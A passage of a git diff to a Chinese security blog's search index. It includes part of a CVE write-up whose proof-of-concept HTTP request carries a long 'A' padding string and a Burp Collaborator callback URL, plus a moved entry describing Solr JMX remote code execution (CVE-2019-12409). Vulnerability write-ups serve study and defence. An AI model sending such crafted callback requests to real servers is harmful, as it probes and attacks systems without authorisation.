AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA|http://9mwa2r71altec4jboehesqx09rfi3lra.oastify.com/ HTTP/1.1</span><br><span class="line">Host: 123.58.224.8:31003</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><a href="/../assets/img/image-76.png" title="alt text" class="gallery-item"><img src="/../assets/img/image-76.png" alt="alt text"></a></p><p><a href="/../assets/img/image-77.png" title="alt text" class="gallery-item"><img src="/../assets/img/image-77.png" alt="alt text"></a></p><h2 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h2></div><script src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
       
@@ -823,7 +823,7 @@
             
             <tag> CVE </tag>
             
-            <tag> WevSec </tag>
+            <tag> 中间件 </tag>
             
         </tags>
       
@@ -859,6 +859,33 @@
     
     
     <entry>
+      <title>solr 代码执行 (CVE-2019-12409)</title>
+      <link href="/2024/11/13/2024-08-19-vulfocus/"/>
+      <url>/2024/11/13/2024-08-19-vulfocus/</url>
+      
+        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/css/lightgallery.min.css" /><div class=".article-gallery"><p>Java ManagementExtensions（JMX）是一种Java技术，为管理和监视应用程序、系统对象、设备（如打印机）和面向服务的网络提供相应的工具。JMX 作为 Java的一种Bean管理机制，如果JMX服务端口暴露，那么远程攻击者可以让该服务器远程加载恶意的Bean文件，随着Bean的滥用导致远程代码执行。</p><p><a href="/../assets/img/image-74.png" title="alt text" class="gallery-item"><img src="/../assets/img/image-74.png" alt="alt text"></a></p></div><script src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
+      
+      
+      <categories>
+          
+          <category> sec </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> sec </tag>
+            
+            <tag> bug </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>基线检查表</title>
       <link href="/2024/11/13/2024-08-12-%E5%9F%BA%E7%BA%BF%E6%A3%80%E6%9F%A5%E8%A1%A8/"/>
       <url>/2024/11/13/2024-08-12-%E5%9F%BA%E7%BA%BF%E6%A3%80%E6%9F%A5%E8%A1%A8/</url>
@@ -882,33 +909,6 @@
             <tag> 安全审计 </tag>
             
             <tag> 网络设备防护 </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>solr 代码执行 (CVE-2019-12409)</title>
-      <link href="/2024/11/13/2024-08-19-vulfocus/"/>
-      <url>/2024/11/13/2024-08-19-vulfocus/</url>
-      
-        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/css/lightgallery.min.css" /><div class=".article-gallery"><p>Java ManagementExtensions（JMX）是一种Java技术，为管理和监视应用程序、系统对象、设备（如打印机）和面向服务的网络提供相应的工具。JMX 作为 Java的一种Bean管理机制，如果JMX服务端口暴露，那么远程攻击者可以让该服务器远程加载恶意的Bean文件，随着Bean的滥用导致远程代码执行。</p><p><a href="/../assets/img/image-74.png" title="alt text" class="gallery-item"><img src="/../assets/img/image-74.png" alt="alt text"></a></p></div><script src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
-      
-      
-      <categories>
-          
-          <category> sec </category>
-          
-      </categories>
-      
-      
-        <tags>
-            
-            <tag> sec </tag>
-            
-            <tag> bug </tag>
             
         </tags>
       
